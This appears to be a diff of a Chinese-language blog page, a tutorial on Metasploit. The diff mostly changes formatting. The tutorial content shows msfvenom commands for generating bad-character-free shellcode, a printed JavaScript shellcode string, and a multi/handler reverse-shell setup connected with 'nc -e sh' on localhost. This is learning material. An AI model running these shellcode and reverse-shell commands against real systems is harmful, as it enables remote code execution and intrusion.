@@ -22,7 +22,6 @@ if (!doNotTrack) {
 </script>
 
 
-
 <link rel="icon" type="image/png" href="/favicon.png">
 
 
@@ -103,34 +102,34 @@ if (!doNotTrack) {
 <p><a href="https://www.rapid7.com/db/?type=metasploit">Vulnerability &amp; Exploit Database | Rapid7</a></p>
 <h2 id="產生shellcode">產生shellcode</h2>
 <p>顯示payload列表</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">shellcode search arm -l payload 
-</code></pre></div><p>生成shellcode</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/exec CMD<span style="color:#f92672">=</span>calc.exe -f python 
-</code></pre></div><p>避免含有<code>null</code>字元</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/exec CMD<span style="color:#f92672">=</span>calc.exe -f python -b <span style="color:#e6db74">&#39;\x00&#39;</span>
-</code></pre></div><p>避免含有換行，注意windows的<code>\r</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/x64/exec CMD<span style="color:#f92672">=</span>calc.exe -f python -b <span style="color:#e6db74">&#39;\x00\x0a\x0d&#39;</span>
-</code></pre></div><p>產生 linux shellcode</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x64/exec CMD<span style="color:#f92672">=</span>whoami -f js_le --nopsled <span style="color:#ae81ff">32</span>
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">unescape</span>(<span style="color:#e6db74">&#34;%u99fd%ufc9f%u9e90%u9398%u9192%u9392%u989f%uf99b%u9b91%u9b90%uf89f%u9ef9%uf8fc%u9b9b%u98fd%u9b98%ub848%u622f%u6e69%u732f%u0068%u5099%u5f54%u6652%u2d68%u5463%u525e%u07e8%u0000%u7700%u6f68%u6d61%u0069%u5756%u5e54%u3b6a%u0f58%u4105&#34;</span>)
-</code></pre></div><p>多個參數</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x64/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;echo exploit working&#39;</span> -f js_le -n <span style="color:#ae81ff">32</span> -e generic/none
-</code></pre></div><p>也可以用 <code>-f hex</code> 之後得到一整串 hex 可以切成 byte，或者轉乘 base64 拿去 cyberchef 轉換</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shellcode search arm -l payload 
+</span></span></code></pre></div><p>生成shellcode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/exec CMD<span style="color:#f92672">=</span>calc.exe -f python 
+</span></span></code></pre></div><p>避免含有<code>null</code>字元</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/exec CMD<span style="color:#f92672">=</span>calc.exe -f python -b <span style="color:#e6db74">&#39;\x00&#39;</span>
+</span></span></code></pre></div><p>避免含有換行，注意windows的<code>\r</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/exec CMD<span style="color:#f92672">=</span>calc.exe -f python -b <span style="color:#e6db74">&#39;\x00\x0a\x0d&#39;</span>
+</span></span></code></pre></div><p>產生 linux shellcode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x64/exec CMD<span style="color:#f92672">=</span>whoami -f js_le --nopsled <span style="color:#ae81ff">32</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">unescape</span>(<span style="color:#e6db74">&#34;%u99fd%ufc9f%u9e90%u9398%u9192%u9392%u989f%uf99b%u9b91%u9b90%uf89f%u9ef9%uf8fc%u9b9b%u98fd%u9b98%ub848%u622f%u6e69%u732f%u0068%u5099%u5f54%u6652%u2d68%u5463%u525e%u07e8%u0000%u7700%u6f68%u6d61%u0069%u5756%u5e54%u3b6a%u0f58%u4105&#34;</span>)
+</span></span></code></pre></div><p>多個參數</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x64/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;echo exploit working&#39;</span> -f js_le -n <span style="color:#ae81ff">32</span> -e generic/none
+</span></span></code></pre></div><p>也可以用 <code>-f hex</code> 之後得到一整串 hex 可以切成 byte，或者轉乘 base64 拿去 cyberchef 轉換</p>
 <h3 id="注意">注意</h3>
 <p>如果在操作nc時，nc也可能受到<code>\x00</code>、<code>\x0a</code>、<code>\x0d</code>的影響。</p>
 <h2 id="建立反向shell">建立反向shell</h2>
 <p>透過msf的內建session監聽，<code>-q</code>僅用來不打印初始圖像</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q   
-</code></pre></div><p>配置使用模塊</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">use exploit/multi/handler
-set payload generic/shell_reverse_tcp
-</code></pre></div><p>配置反向shell使用端口與地址</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">set lhost 0.0.0.0
-set lport 1337
-run
-</code></pre></div><p>啟動nc進行連結</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 127.0.0.1 <span style="color:#ae81ff">1337</span> -e sh  
-</code></pre></div><h3 id="參見">參見</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole -q   
+</span></span></code></pre></div><p>配置使用模塊</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>use exploit/multi/handler
+</span></span><span style="display:flex;"><span>set payload generic/shell_reverse_tcp
+</span></span></code></pre></div><p>配置反向shell使用端口與地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>set lhost 0.0.0.0
+</span></span><span style="display:flex;"><span>set lport 1337
+</span></span><span style="display:flex;"><span>run
+</span></span></code></pre></div><p>啟動nc進行連結</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 127.0.0.1 <span style="color:#ae81ff">1337</span> -e sh  
+</span></span></code></pre></div><h3 id="參見">參見</h3>
 <ul>
 <li><a href="https://metasploit.help.rapid7.com/docs/working-with-payloads">Working with Payloads</a></li>
 <li><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit">How to use a reverse shell in Metasploit</a></li>
@@ -186,7 +185,7 @@ run
     <a href="/tags" class="footer">Tags</a>
   </div>
   <div>
-    r888800009©2018-2022.
+    r888800009©2018-2023.
     All Rights Reserved.
   </div>
   
